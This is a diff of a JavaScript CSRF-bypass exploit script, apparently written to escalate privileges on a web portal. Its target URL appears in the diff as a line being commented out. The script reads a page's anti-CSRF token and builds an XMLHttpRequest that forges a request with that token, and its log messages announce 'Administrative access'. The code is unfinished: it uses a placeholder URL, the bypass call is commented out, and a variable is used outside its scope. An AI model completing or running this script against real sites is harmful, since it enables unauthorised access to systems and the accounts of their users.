@@ -1,11 +1,33 @@
 //BEGIN
-console.log("beginning exploit");
+console.log("Beginning exploit...");
 console.log("GET URL is: " + GET_URL);
 console.log("might need to put the entire https:// URL here if this fails..");
 
 
-var xyz = document.querySelector('input[name=_token]').value;
-console.log("Custom Payload has gained token, CSRF Token is: " + xyz);
+function readToken() {
+  console.log("Reading response to extract anti-CSRF token...");
+  var extract = document.querySelector('input[name=_token]').value;
+  console.log("Token extracted successfully: " + extract);
+  console.log();
+
+}
+
+function bypassCSRF() {
+  console.log("Instantiating XMLHttpRequest...");
+  //instantiating XMLHttpRequest
+  var poc = new XMLHttpRequest();
+  console.log("Assigning payload...");
+  poc.open("GET","http://some.url"); //need to add the POST CSRF req here associtaed with user role access, with http post body data included.
+  console.log("Parsing token to XHR to bypass CSRF protection mechanism...");
+  poc.setRequestHeader("X-CSRF-TOKEN", extract);
+  console.log("Firing exploit...");
+  poc.send();
+  console.log("Exploit completed! You should now have Administrative access!");
+  console.log();
+}
+
+readToken();
+// bypassCSRF();
 
 function getTokenJS() {
     var xhr = new XMLHttpRequest();
@@ -33,8 +55,8 @@ function getTokenJS() {
     // Make the request
     //xhr.send(null);
 }
-console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
-var GET_URL="https://investorportal.ispt.net.au/my-profile";
-getTokenJS();
+//console.log("Done! Verify extracted token value is correct, if so; write xhr function to fire the privesc");
+//var GET_URL="https://investorportal.ispt.net.au/my-profile";
+//getTokenJS();
 console.log("end of exploit");
 //EOF
